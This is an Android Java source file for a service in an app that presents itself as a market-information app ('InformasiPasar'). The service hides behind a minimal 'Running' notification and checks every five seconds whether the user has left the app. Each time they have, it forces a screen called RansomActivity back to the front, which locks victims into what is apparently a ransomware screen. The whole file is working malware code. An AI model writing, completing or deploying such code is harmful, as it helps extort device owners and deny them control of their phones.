package com.informasipasar.app;

import android.app.ActivityManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.util.List;

public class ReopenLoopService extends Service {

    private static final String CH = "reopen_channel";
    private static final String SELF = "com.informasipasar.app";
    private Handler handler;
    private Runnable loop;

    @Override
    public void onCreate() {
        super.onCreate();
        createChannel();
        startForeground(5, baseNotif());

        handler = new Handler(Looper.getMainLooper());
        loop = new Runnable() {
            @Override public void run() {
                if (!isSelfForeground()) {
                    // user keluar dari aplikasi -> buka lagi
                    try {
                        Intent i = new Intent(ReopenLoopService.this, RansomActivity.class);
                        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                        startActivity(i);
                    } catch (Exception ignored) {}
                }
                handler.postDelayed(this, 5000);
            }
        };
        handler.post(loop);
    }

    private boolean isSelfForeground() {
        try {
            ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
            if (am == null) return false;
            List<ActivityManager.RunningAppProcessInfo> procs = am.getRunningAppProcesses();
            if (procs == null) return false;
            for (ActivityManager.RunningAppProcessInfo p : procs) {
                if (p.processName.equals(SELF)
                        && p.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
                    return true;
                }
            }
        } catch (Exception ignored) {}
        return false;
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    CH, "Reopen", NotificationManager.IMPORTANCE_MIN);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification baseNotif() {
        return new NotificationCompat.Builder(this, CH)
                .setContentTitle("InformasiPasar")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setOngoing(true)
                .build();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
